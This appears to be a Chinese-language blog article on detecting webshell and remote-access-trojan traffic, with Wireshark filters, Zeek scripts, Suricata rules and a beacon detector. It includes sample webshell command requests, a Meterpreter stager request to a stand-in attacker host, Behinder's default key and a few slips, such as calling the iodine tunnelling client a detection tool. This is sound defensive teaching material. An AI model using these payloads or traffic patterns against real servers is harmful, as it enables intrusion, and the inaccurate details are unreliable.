---

title: 木马流量分析详解
tags: \[Web 安全, 流量分析, 木马通信, WebShell, C2 检测, 安全防御]
date: 2024-07-03

---

# 木马流量分析详解

流量分析是检测木马通信最可靠的手段之一。无论攻击者如何做文件免杀，数据总要通过网络传输。本文从实战角度出发，系统梳理常见 WebShell 管理工具、远控木马（RAT）的通信流量特征，以及如何通过 Wireshark、Zeek 等工具进行检测分析。

## 1. 流量分析基础

### 1.1 为什么要做流量分析

| 检测方式     | 文件扫描 | 行为监控 | 流量分析             |
| ------------ | -------- | -------- | -------------------- |
| 检测对象     | 磁盘文件 | 进程行为 | 网络数据包           |
| 内存马检测   | 无效     | 部分有效 | **有效**             |
| 加密木马检测 | 无效     | 困难     | **有效（行为特征）** |
| 部署难度     | 低       | 中       | 中                   |
| 误报率       | 低       | 中       | 取决于规则           |

流量分析的核心优势：**木马可以不写文件，但无法不通信**。

### 1.2 分析工具链

```bash
# 数据包捕获
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 port 80 or port 443 -w web.pcap
tshark -i eth0 -w capture.pcapng

# 分析工具
Wireshark    # GUI分析（首选）
tshark      # 命令行版Wireshark
Zeek (Bro)  # 网络安全监控平台
Suricata    # IDS/IPS引擎
ngrep       # 网络层grep
Chaosreader # 会话还原
NetworkMiner # 文件提取

# HTTP流量快速分析
tcpdump -s 0 -A 'tcp port 80' -w http_traffic.pcap
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
```

### 1.3 流量分析通用思路

    1. 宏观统计
       ├── 协议分布（HTTP/HTTPS/DNS/TCP/UDP占比）
       ├── 连接频率（是否存在心跳包、高频通信）
       ├── 流量方向（出站流量占比）
       └── 时间特征（是否在非业务时段活跃）

    2. 微观分析
       ├── 请求URL（是否有异常路径）
       ├── 请求体（POST数据是否加密/编码）
       ├── 响应体（是否返回异常内容）
       ├── Headers（User-Agent/Cookie/自定义头）
       ├── 会话持续时长
       └── 数据包大小规律

    3. 行为关联
       ├── 同一IP的不同目标端口
       ├── DNS查询与后续连接的关联
       ├── HTTP请求与进程的对应关系
       └── 加密流量的TLS指纹（JA3/JA4 Hash）

---

## 2. WebShell 管理工具流量特征

### 2.1 中国蚁剑 (AntSword)

蚁剑是最流行的开源 WebShell 管理工具，默认使用 HTTP POST 明文传输。

#### 默认流量特征

```http
POST /shell.php HTTP/1.1
Host: target.com
User-Agent: antSword/v2.1
Content-Type: application/x-www-form-urlencoded
Content-Length: xxx

cmd=@ini_set("display_errors","0");@set_time_limit(0);...
```

**关键特征**：

```yaml
# 请求头特征（默认配置）
User-Agent: antSword/v2.1 或 antSword/v2.0
# 请求体特征（Base64编码的PHP代码）
# 始终以固定模式开头
# @ini_set("display_errors","0");
# @set_time_limit(0);

# 请求体整体经过URL编码
# 解码后包含大量PHP危险函数调用

# Body内容以Base64编码开头
# 特征前缀: Y21kPQ== 或 cmd=
```

#### 加密模式流量

蚁剑支持 AES-128-CBC 加密模式：

```javascript
// 蚁剑加密配置
// 密钥: 自定义（如 test）
// 用AES-128-CBC加密后Base64编码
// 服务端解密后eval执行
```

加密后的流量特征：

- POST Body 为固定长度的 Base64 字符串（无 URL 编码）

- 每次请求的 Base64 字符串不同但长度相似

- 解密后代码结构一致（`@ini_set;@set_time_limit;...`开头）

#### Wireshark 检测规则

```bash
# 过滤蚁剑默认UA
http.user_agent contains "antSword"

# 过滤蚁剑特征函数调用
http contains "display_errors"
http contains "set_time_limit"

# Zeek检测规则
# 检测连续高频率POST请求到同一路径
# 检测包含 @ini_set 的POST Body
```

---

### 2.2 冰蝎 (Behinder)

冰蝎是特征最隐蔽的 WebShell 管理工具之一，使用 AES 双向加密，无固定特征。

#### 通信流程

    1. 客户端 → 服务端: AES加密的payload（默认密钥: rebeyond）
    2. 服务端解密 → exec执行 → AES加密结果 → 返回
    3. 每次请求的密文格式不固定
    4. 默认使用application/octet-stream Content-Type

#### 冰蝎 3.x 流量特征

```http
POST /shell.php HTTP/1.1
Host: target.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8
Content-Type: application/octet-stream
Content-Length: 8960

<96字节AES加密后的二进制数据>
```

**识别特征**：

| 特征维度       | 冰蝎 3.x 特征                                     |
| -------------- | ------------------------------------------------- |
| Content-Type   | `application/octet-stream`（二进制流）            |
| Accept         | 包含完整的 5 段 Accept 值（和浏览器请求一致）     |
| Content-Length | 通常较大（加密后体积膨胀），常见 8000-9000 字节   |
| 请求间隔       | 低频，通常间隔数秒                                |
| URL 路径       | 单一固定的 php/jsp/aspx 路径                      |
| 响应           | 同样是 AES 加密的二进制流，无可见字符             |
| Cookie         | 无特殊特征（不携带 Cookie 或携带正常会话 Cookie） |

#### 冰蝎 4.x 新特征

冰蝎 4.x 增加了更多混淆和自定义选项：

```http
# 4.x支持自定义Content-Type
# 可伪装为 image/jpeg, text/html 等

# 4.x新增Header混淆
# 可添加随机请求头填充（如 X-Requested-With, Referer等）

# 4.x新增流量填充
# 请求体和响应体前后可添加随机填充字节
# 使流量大小每次不同
```

#### 冰蝎流量检测技巧

```bash
# 1. 检测Content-Type与请求体不一致
# 声明为 image/jpeg 但内容不是合法图片头

# 2. 检测异常Content-Length
# 对该URL历史请求大小统计，发现异常大包

# 3. 检测请求间隔和规律性
# 冰蝎每次操作产生一对请求/响应
# 分析访问时间序列

# 4. 检测无Referer的POST请求到单一脚本
# 正常业务请求通常有Referer来源

# 5. JA3/TLS指纹检测
# 冰蝎使用Java/.NET的TLS库，有固定JA3指纹

# Wireshark过滤
http.content_type == "application/octet-stream" && http.request.method == "POST"
```

#### 解密冰蝎流量

```python
# 如果获取到密钥，可以解密冰蝎流量
from Crypto.Cipher import AES
import base64

key = b'rebeyond'  # 冰蝎默认密钥（实际可能有变种）
# 密钥处理逻辑
key = key.ljust(16, b'\x00')  # 填充到16字节

def decrypt_behinder(data):
    cipher = AES.new(key, AES.MODE_CBC, iv=b'\x00'*16)
    decrypted = cipher.decrypt(base64.b64decode(data))
    # 去除PKCS7填充
    pad_len = decrypted[-1]
    return decrypted[:-pad_len]
```

---

### 2.3 哥斯拉 (Godzilla)

哥斯拉是功能最强大的 Java WebShell 管理工具之一，支持多种加密模式和 Payload。

#### 通信流程

    1. 首次连接：发送初始化payload
    2. 客户端 → 服务端:
       - Java AES: 加密后的序列化Java对象（或JSON）
       - PHP: XOR/Base64编码后的payload
       - ASP: Base64编码的C#/VB代码
    3. 服务端 → 客户端:
       - 加密的执行结果

#### Java 版流量特征

```http
POST /shell.jsp HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Content-Type: application/octet-stream
Cookie: JSESSIONID=xxx; pass=加密数据
Content-Length: xxx

<加密二进制数据>
```

**哥斯拉 Java 版识别特征**：

| 特征维度                  | 说明                                            |
| ------------------------- | ----------------------------------------------- |
| **Cookie 中的 pass 字段** | 哥斯拉默认将 payload 放在 Cookie 的 pass 参数中 |
| **Cookie 长度异常**       | pass 字段的值经 Base64 编码后很长（数百字节）   |
| **请求体**                | 包含 Java 序列化头部标记 `aced0005`             |
| **响应特征**              | 响应开头可能为 Java 序列化数据                  |
| **URL 模式**              | 固定的`.jsp`或`.jspx`路径                       |
| **请求频率**              | 低频但有规律，操作间隔明显                      |

```bash
# 检测哥斯拉Cookie特征
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie | grep "pass="

# 检测Java序列化魔术字节
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data | grep -i "aced0005"

# 检测超长Cookie
tshark -r capture.pcap -Y "http.cookie_len > 200"
```

#### PHP 版流量特征

```http
POST /shell.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

pass=加密数据&key=加密数据
```

PHP 版的 payload 以 POST 表单字段传输：

- 常见参数名：`pass`、`key`、`cmd`

- Body 内容经过 XOR+Base64 双重编码

- 解码后结构一致的 PHP 代码

#### 各版本哥斯拉流量对比

| 语言版本 | Content-Type                        | Payload 位置               | 加密方式     |
| -------- | ----------------------------------- | -------------------------- | ------------ |
| Java     | `application/octet-stream`          | Cookie `pass=` / POST Body | AES-128-ECB  |
| PHP      | `application/x-www-form-urlencoded` | POST Body `pass=`          | XOR + Base64 |
| ASP/ASPX | `application/octet-stream`          | POST Body                  | AES/Base64   |
| C#       | `application/octet-stream`          | POST Body                  | AES          |

---

### 2.4 大马/其他 WebShell 流量

#### PHP 大马（如 Wso、C99、r57）

```http
POST /wso.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxx

------WebKitFormBoundaryxxx
Content-Disposition: form-data; name="cmd"

whoami
------WebKitFormBoundaryxxx--
```

特征：POST 表单中包含`cmd`、`command`、`action`等参数，值为可读的系统命令。

#### JSP 大马（如 JspWebshell）

```http
POST /shell.jsp HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=execCommand&cmd=whoami&dir=/var/www/html
```

#### 一句话木马原始 HTTP

```http
POST /1.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

pass=system('whoami');
```

一句话木马的 POST 参数通常很短，参数值包含 PHP/ASP 代码片段。

---

## 3. 远控木马 (RAT) 流量特征

### 3.1 Cobalt Strike Beacon

Cobalt Strike 是最流行的红队 C2 框架，其 Beacon 通信有多种模式。

#### HTTP Beacon

```http
GET /api/status HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Cookie: session=Base64EncodedMetadata
Accept: */*
Connection: Keep-Alive

# 响应
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 208

<加密的Beacon任务数据>
```

**CS Beacon HTTP 特征**：

| 特征                  | 识别方法                                                             |
| --------------------- | -------------------------------------------------------------------- |
| **URI 模式**          | 随机目录+文件名（如 `/aaaaaaaa/bbbbbbbb/cccccccc/`）或伪装为常见路径 |
| **Malleable C2 变换** | 可自定义所有 HTTP 特征（URI/UA/Headers/Body），但底层行为特征不变    |
| **心跳间隔**          | 有规律的 GET 请求（默认 60 秒），用于任务拉取                        |
| **GET+POST 组合**     | GET 拉取任务 → POST 返回执行结果 → 循环                              |
| **Cookie 内容**       | Cookie 中的值通常是 Beacon 元数据（AES 加密+Base64 编码）            |
| **Content-Length**    | POST 请求体大小随任务变化，但 GET 请求通常较小                       |

```bash
# Wireshark检测CS Beacon
# 1. 查找规律的HTTP GET请求（同间隔、同URL）
# 2. 查找异常User-Agent组合
# 3. 检测小体积POST请求包含加密数据

# JA3指纹检测Cobalt Strike默认HTTPS证书
# CS默认证书的JA3指纹已知
```

#### DNS Beacon

```bash
# CS DNS Beacon的DNS查询模式
# A记录查询，子域名包含Base64编码的数据
abc123.cccc.example.com
def456.cccc.example.com

# 查询间隔规律（如每30秒一次）
# 子域名长度异常长（通常50+字符）
# 查询类型以A记录为主
```

```bash
# 检测DNS隧道/Beacon
tcpdump -i eth0 port 53 -w dns.pcap
tshark -r dns.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -30

# 检测异常长度子域名
tshark -r dns.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | awk '{print length, $0}' | sort -rn | head -20

# 检测高频DNS查询的域名（可能是DGA或DNS隧道）
tshark -r dns.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | awk -F. '{print $(NF-1)"."$NF}' | sort | uniq -c | sort -rn
```

#### HTTPS Beacon

```bash
# HTTPS Beacon使用TLS加密通信
# 检测重点转向TLS层特征

# JA3指纹检测
# Cobalt Strike默认HTTPS证书的JA3指纹是固定的
# 可通过Zeek的JA3插件或Suricata检测

# 证书特征
# CS默认生成自签名证书
# 证书信息通常有异常（过期、不匹配的域名、随机组织名等）

# JARM指纹
# 配合JA4+（JARM升级版）检测
```

---

### 3.2 Metasploit Meterpreter

#### reverse_tcp

```http
# Meterpreter reverse_tcp使用自定义二进制协议
# 非HTTP，直接TCP连接

# 特征：
# - 通常连接高端口（如4444）
# - 数据包开头有固定魔术字节
# - 初始握手有固定长度和模式
```

```bash
# 检测非标准端口的大流量TCP连接
netstat -antp | grep ESTABLISHED | grep -v ":80\|:443\|:22\|:3306"

# 使用Zeek检测异常TCP会话
# 关注：短时间大量数据传输、非标准端口长连接
```

#### reverse_http/reverse_https

```http
GET /AbCdE HTTP/1.1
Host: attacker.com:8080
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)
Connection: Keep-Alive
Cache-Control: no-cache

# Stager特征URI: 长度5-6的随机大小写字母组合
# Stageless特征: 固定长度的POST请求体
```

**Meterpreter HTTP 特征**：

| 特征             | 说明                                                                       |
| ---------------- | -------------------------------------------------------------------------- |
| **Stager URI**   | 短随机字符串（4-6 字符），仅大小写字母（无数字）                           |
| **UA**           | 默认 UA: `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)` |
| **响应**         | Stager 阶段响应体为 PE 文件头 `MZ`                                         |
| **心跳**         | 固定间隔的 GET 请求（如 5 秒）                                             |
| **URI 无扩展名** | 与正常 Web 访问不同，URI 不含`.html/.php`等                                |

```bash
# 检测Meterpreter Stager下载（响应包含PE文件头）
tshark -r capture.pcap -Y "http.response" -T fields -e http.content_type -e http.content_length | grep -i "application"

# 检测异常UA的规律性请求
tshark -r capture.pcap -Y "http.user_agent" -T fields -e http.user_agent | sort | uniq -c | sort -rn
```

---

### 3.3 其他常见 RAT 流量

#### Gh0st / 灰鸽子

```bash
# Gh0st使用自定义TCP协议
# 初始心跳包有固定特征
# 默认端口：8000
# 数据包头部固定标识：Gh0st
```

#### Poison Ivy

```bash
# TCP协议，默认端口3460
# 初始握手256字节加密交换
# 心跳间隔可配置
```

#### njRAT / Bladabindi

```bash
# 通常使用动态DNS域名作为C2
# TCP端口通常是1177、5552等
# .NET编写的RAT，通信协议简单
```

---

## 4. 流量隧道技术检测

### 4.1 DNS 隧道

DNS 隧道利用 DNS 协议传输非 DNS 数据，用于绕过防火墙和内容审计。

```bash
# 检测DNS隧道
# 1. TXT记录查询量异常
# 大体积TXT记录
# TXT记录包含Base64或Hex编码的数据

# 2. 查询类型分布异常
# 正常流量90%+为A/AAAA记录
# 隧道流量含大量TXT/MX/CNAME/NULL记录

# 3. 子域名熵值计算
# 正常域名：低熵值（可读词汇）
# 隧道域名：高熵值（随机字符串）

# 4. 域名长度异常
# 隧道子域名通常超过52字符
# 单域名总长可能超过200字符
```

**DNS 隧道检测脚本逻辑**：

```python
import math
from collections import Counter

def shannon_entropy(data):
    """计算字符串的香农熵"""
    if not data:
        return 0
    counter = Counter(data)
    length = len(data)
    entropy = 0
    for count in counter.values():
        p = count / length
        entropy -= p * math.log2(p)
    return entropy

# 正常域名的熵值一般在 2.0 - 3.5 之间
# DNS隧道域名的熵值通常 > 4.0
# 举例：
# www.google.com → 熵值 ~2.6
# A8f3X9kL2mN.example.com → 熵值 ~4.5
```

```bash
# 使用Iodine检测工具
iodine -c -P password tunnel.example.com

# tcpdump抓DNS流量分析
tcpdump -i eth0 -n port 53 -w dns.pcap
tshark -r dns.pcap -q -z io,phs  # 协议层级统计
```

---

### 4.2 HTTP/HTTPS 隧道

```bash
# HTTP隧道特征
# 1. 持续的长连接（HTTP Keep-Alive + 长时间不关闭）
# 2. POST请求特别大（正常POST通常<100KB）
# 3. 响应Content-Type与实际内容不符
# 4. 请求/响应完全无可见字符（全部加密数据）
# 5. CONNECT方法请求（HTTP隧道代理特征）

# 检测HTTP CONNECT隧道
tshark -r capture.pcap -Y "http.request.method == CONNECT"
```

---

### 4.3 ICMP 隧道

```bash
# ICMP隧道利用ICMP Echo Request/Reply的Data字段传输数据
# 检测特征：
# 1. ICMP包数量异常多（正常ping是低频操作）
# 2. ICMP Payload包含非标准数据（正常ping携带固定模式的数据）
# 3. ICMP Payload长度异常（正常ping通常是32/56字节）
# 4. 相同源目IP的大量ICMP通信

# 检测命令
tshark -r capture.pcap -Y "icmp" -T fields -e icmp.code -e icmp.type -e data.len | sort | uniq -c

# 查看ICMP Payload
tshark -r capture.pcap -Y "icmp.type == 8" -T fields -e data.data
```

---

## 5. 实战 Wireshark 分析技巧

### 5.1 常用过滤表达式

```bash
# === HTTP流量过滤 ===

# 只看POST请求
http.request.method == "POST"

# 查看特定路径
http.request.uri contains "shell"
http.request.uri matches "\.php$"

# 过滤无Referer的POST请求（可疑）
http.request.method == "POST" && !http.referer

# 异常Content-Type
http.content_type == "application/octet-stream"

# 响应中包含eval/system
http.response.code == 200 && http contains "eval"

# 大POST请求体
http.request.method == "POST" && http.content_length > 5000

# === 通用过滤 ===

# 过滤特定IP的流量
ip.addr == 192.168.1.100

# 过滤非标准端口
tcp.port not in {80,443,22,3306}

# 过滤心跳包（规律间隔的TCP Keep-Alive或应用层心跳）
tcp.analysis.keep_alive

# 过滤加密流量
tls.handshake.type == 1  # TLS Client Hello
ssl.handshake.type == 1   # SSL Client Hello

# IP地理位置（需GeoIP配置）
ip.geoip.country != "CN"
```

### 5.2 统计与分析

```bash
# Wireshark菜单操作:
# Statistics → Protocol Hierarchy  → 查看协议占比
# Statistics → Conversations      → 查看会话列表
# Statistics → Endpoints          → 端点通信统计
# Statistics → HTTP → Request     → HTTP请求分布
# Statistics → IO Graph           → 流量时间图

# tshark 命令行统计
# 统计HTTP请求频率
tshark -r capture.pcap -Y "http.request" -T fields -e frame.time_relative | head -50

# 统计各IP流量
tshark -r capture.pcap -q -z conv,tcp

# 统计HTTP Host分布
tshark -r capture.pcap -Y "http.host" -T fields -e http.host | sort | uniq -c | sort -rn

# 导出HTTP对象（文件还原）
tshark -r capture.pcap --export-objects "http,/tmp/http_objects"

# 统计DNS查询
tshark -r capture.pcap -q -z dns,tree
```

### 5.3 从流量中提取文件

```bash
# Wireshark: File → Export Objects → HTTP → 选择导出

# tshark提取HTTP文件
tshark -r capture.pcap --export-objects "http,/output/dir"

# 使用foremost/binwalk从pcap中提取
foremost -t all -i capture.pcap -o output/
binwalk -e capture.pcap

# NetworkMiner (GUI工具，自动提取传输文件)
```

---

## 6. Zeek (Bro) 木马检测

### 6.1 Zeek 基础配置

```bash
# Zeek安装
apt install zeek
# 或源码编译

# 基本使用
zeek -r capture.pcap
# 生成各类日志文件:
# conn.log, http.log, dns.log, ssl.log, files.log, notice.log
```

### 6.2 自定义木马检测脚本

```zeek
# detect-webshell.zeek
# 检测蚁剑默认User-Agent
event http_header(c: connection, is_orig: bool, original_headers: string_set,
                  name: string, value: string)
{
    if (name == "USER-AGENT" && "antSword" in value)
    {
        NOTICE([$note=Webshell::AntSword_Detected,
                $msg=fmt("AntSword UA detected: %s from %s", value, c$id$orig_h),
                $conn=c]);
    }
}

# 检测冰蝎Content-Type特征
event http_request(c: connection, method: string, original_URI: string,
                   version: string, host: string, referrer: string,
                   user_agent: string, content_type: string)
{
    if (method == "POST" && content_type == "application/octet-stream")
    {
        # 检查是否为冰蝎特征（结合更多维度）
        NOTICE([$note=Webshell::OcetStream_POST,
                $msg=fmt("Suspicious POST with octet-stream from %s to %s",
                         c$id$orig_h, host),
                $conn=c]);
    }
}

# 检测异常Cookie长度（哥斯拉特征）
event http_header(c: connection, is_orig: bool, original_headers: string_set,
                  name: string, value: string)
{
    if (name == "COOKIE" && |value| > 200)
    {
        NOTICE([$note=Webshell::LongCookie,
                $msg=fmt("Abnormally long Cookie (%d bytes) from %s", |value|, c$id$orig_h),
                $conn=c]);
    }
}

# 检测DNS隧道
event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
{
    # 检测超长子域名
    local parts = split_string(query, /\./);
    if (|parts[0]| > 40)
    {
        NOTICE([$note=DNS::LongSubdomain,
                $msg=fmt("Long DNS subdomain: %s from %s", query, c$id$orig_h),
                $conn=c]);
    }

    # 检测子域名熵值异常
    # (需要实现熵值计算函数)
}
```

---

## 7. Suricata IDS 规则

### 7.1 蚁剑检测规则

```suricata
# 检测蚁剑默认User-Agent
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"WebShell - AntSword User-Agent Detected";
    flow:to_server,established;
    http.user_agent; content:"antSword"; nocase;
    classtype:trojan-activity;
    sid:1000001; rev:1;
)

# 检测蚁剑PHP payload特征
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"WebShell - AntSword PHP Payload";
    flow:to_server,established;
    http.request_body; content:"@ini_set"; nocase;
    http.request_body; content:"set_time_limit"; nocase;
    classtype:trojan-activity;
    sid:1000002; rev:1;
)
```

### 7.2 冰蝎检测规则

```suricata
# 检测冰蝎Content-Type + 大包
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"WebShell - Behinder Suspicious POST";
    flow:to_server,established;
    http.method; content:"POST";
    http.content_type; content:"application/octet-stream";
    http.content_len; content:!"";
    # 冰蝎加密后包体通常较大
    # 正常octet-stream上传都会用multipart
    classtype:trojan-activity;
    sid:1000003; rev:1;
)

# 检测冰蝎4.x（流量前后有随机填充）
# 需结合AI/ML模型
```

### 7.3 哥斯拉检测规则

```suricata
# 检测哥斯拉Java版（Cookie中pass字段）
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"WebShell - Godzilla Java Cookie pass";
    flow:to_server,established;
    http.cookie; content:"pass="; nocase;
    http.cookie; pcre:"/pass=[A-Za-z0-9+\/=]{100,}/";
    classtype:trojan-activity;
    sid:1000004; rev:1;
)

# 检测Java序列化魔术字节
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"WebShell - Java Serialized Object in POST";
    flow:to_server,established;
    http.method; content:"POST";
    http.request_body; content:"|AC ED 00 05|";
    classtype:trojan-activity;
    sid:1000005; rev:1;
)
```

### 7.4 Cobalt Strike 检测规则

```suricata
# 检测CS默认证书JA3指纹（需要ja3插件）
# alert tls ...

# 检测CS DNS Beacon
alert dns $HOME_NET any -> any any (
    msg:"Cobalt Strike - DNS Beacon Pattern";
    dns.query; pcre:"/^[A-Za-z0-9+\/=]{30,}\.[a-z]+\.[a-z]+/";
    classtype:trojan-activity;
    sid:1000006; rev:1;
)

# 检测CS HTTP Beacon（通用特征）
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"Cobalt Strike - HTTP Beacon GET with abnormal Cookie";
    flow:to_server,established;
    http.method; content:"GET";
    http.cookie; pcre:"/^[A-Za-z0-9+\/=]{50,}$/";
    http.uri; pcre:"/^\/[A-Za-z0-9]{3,8}$/";  # 短URI
    classtype:trojan-activity;
    sid:1000007; rev:1;
)
```

---

## 8. TLS 指纹检测 (JA3/JA4)

### 8.1 JA3 原理

JA3 通过对 TLS Client Hello 包中的以下字段计算 MD5 哈希，生成客户端 TLS 指纹：

- TLS 版本

- 密码套件列表

- 扩展列表

- 椭圆曲线参数

- 椭圆曲线格式

<!---->

    # JA3字符串格式
    TLSVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats

    # 示例
    769,47-53-5-10-...,0-5-10-11-13-...,29-23-24,0
    # MD5后生成JA3 Hash

### 8.2 已知恶意软件 JA3 指纹

```bash
# Cobalt Strike (默认HTTPS证书模式)
# JA3: a0e9f5d64349fb13191bc781f81f42e1

# Metasploit Meterpreter (reverse_https)
# JA3: 已知多个变体

# Empire C2
# JA3: 多种变体

# 冰蝎 (Java版使用的TLS库)
# JA3: 与标准Java TLS指纹一致

# 哥斯拉
# JA3: 与标准Java TLS指纹一致
```

### 8.3 JA3 检测实现

```bash
# Zeek + JA3插件
# https://github.com/salesforce/ja3

# 安装后使用
zeek -r capture.pcap ja3

# 生成的ssl.log中会包含ja3和ja3s字段
cat ssl.log | zeek-cut ja3 ja3s server_name

# Python检测
import hashlib
import dpkt

def calculate_ja3(pcap_file):
    # 解析Client Hello
    # 提取字段拼接
    # MD5哈希
    pass
```

---

## 9. 流量分析实战流程

### 9.1 应急响应场景

    发现服务器异常 → 引流镜像抓包 → 分析流量

    1. 确认异常时间段
       └── 缩小分析范围

    2. 宏观分析
       ├── 查看协议分布 → 是否有异常协议的流量
       ├── 查看通信IP → 是否有境外/可疑IP
       ├── 查看端口分布 → 是否有非业务端口通信
       └── 查看流量大小趋势 → 是否有突发大量出网流量

    3. HTTP层分析
       ├── 搜索所有POST请求 → 逐个排查请求体
       ├── 搜索WebShell特征关键词 → eval/system/cmd
       ├── 查看UA分布 → 异常User-Agent
       ├── 查看Referer → 无来源的直接访问
       └── 导出HTTP对象 → 还原传输的文件

    4. DNS层分析
       ├── 查询量异常的域名
       ├── 超长子域名
       ├── DGA特征域名（随机字符+TLD）
       └── 罕见的查询类型（TXT/MX/ANY大增）

    5. TLS层分析
       ├── JA3指纹匹配已知恶意客户端
       ├── 自签名证书
       ├── 新出现的域名证书
       └── 证书过期/不匹配

    6. 关联分析
       ├── DNS查询 → HTTP连接的时间关联
       ├── 同一IP的多端口连接
       ├── Beacon间隔检测（定时规律性请求）
       └── 出入流量比例异常

    7. 判定与溯源
       └── 确认C2地址、木马类型、感染时间、影响范围

### 9.2 Beacon 检测脚本

```python
#!/usr/bin/env python3
"""检测HTTP流量中的Beacon行为（定时心跳）"""

import pyshark
from collections import defaultdict
import statistics

def detect_beacon(pcap_file, min_interval=5, max_interval=3600):
    """检测定时规律性HTTP请求"""
    cap = pyshark.FileCapture(pcap_file, display_filter='http.request')

    # 按 (源IP, 目标IP, URI) 分组
    requests = defaultdict(list)

    for packet in cap:
        try:
            src = packet.ip.src
            dst = packet.ip.dst
            uri = packet.http.request_full_uri
            ts = float(packet.frame_info.time_epoch)
            key = (src, dst, uri)
            requests[key].append(ts)
        except AttributeError:
            continue

    cap.close()

    beacons = []
    for key, timestamps in requests.items():
        if len(timestamps) < 3:  # 少于3次请求不做判断
            continue

        intervals = [timestamps[i+1] - timestamps[i]
                    for i in range(len(timestamps)-1)]

        mean = statistics.mean(intervals)
        stdev = statistics.stdev(intervals) if len(intervals) > 1 else 0

        # 判断标准: 间隔标准差很小说明是定时请求
        if min_interval <= mean <= max_interval and stdev < mean * 0.1:
            beacons.append({
                'src': key[0],
                'dst': key[1],
                'uri': key[2],
                'count': len(timestamps),
                'interval_mean': mean,
                'interval_stdev': stdev
            })

    return beacons

if __name__ == '__main__':
    beacons = detect_beacon('capture.pcap')
    for b in sorted(beacons, key=lambda x: x['count'], reverse=True):
        print(f"[BEACON] {b['src']} -> {b['dst']} | "
              f"间隔={b['interval_mean']:.1f}s±{b['interval_stdev']:.1f}s | "
              f"次数={b['count']} | {b['uri'][:80]}")
```

---

## 10. 木马流量检测总结

### 10.1 各类木马流量特征速查表

| 木马/工具         | 协议           | Content-Type        | 关键特征                                        |
| ----------------- | -------------- | ------------------- | ----------------------------------------------- |
| **蚁剑**          | HTTP           | form-urlencoded     | UA 含`antSword`，Body 含`@ini_set`              |
| **冰蝎 3.x**      | HTTP           | `octet-stream`      | 无可见字符，大 POST 体(8k+)，完整 Accept 头     |
| **冰蝎 4.x**      | HTTP           | 可自定义            | 前后随机填充，伪装 Content-Type                 |
| **哥斯拉 Java**   | HTTP           | `octet-stream`      | Cookie `pass=`超长，Body 含`aced0005`           |
| **哥斯拉 PHP**    | HTTP           | form-urlencoded     | POST `pass=`参数，XOR+Base64 编码               |
| **Cobalt Strike** | HTTP/HTTPS/DNS | 可自定义(Malleable) | 规律心跳 GET，Cookie 有 Base64 元数据，JA3 固定 |
| **Metasploit**    | HTTP           | 多种                | 短随机 URI(4-6 字符)，PE 头响应(MZ)             |
| **DNS 隧道**      | DNS            | N/A                 | TXT/MX 增多，超长子域名(>40 字符)，高熵值       |
| **ICMP 隧道**     | ICMP           | N/A                 | ICMP 包频率异常，Payload 含非标数据             |

### 10.2 检测层次建议

    第一层: 网络边界（防火墙/IDS）
      ├── Suricata规则匹配已知木马特征
      ├── JA3/JA4指纹封锁已知恶意客户端
      ├── 地理IP过滤（非业务国家IP）
      └── 协议异常检测

    第二层: 流量分析平台（Zeek/NTA）
      ├── 全流量日志留存
      ├── Beacon行为检测
      ├── DNS隧道检测
      └── 异常流量基线告警

    第三层: SOC分析
      ├── 人工研判告警
      ├── 内存马关联（流量+进程）
      ├── 威胁情报关联（IOC匹配）
      └── 溯源分析

---

> **核心法则**：木马可以不落地，但数据总要传出去。抓住**通信**这个必须环节，就能发现木马的存在。流量不撒谎。
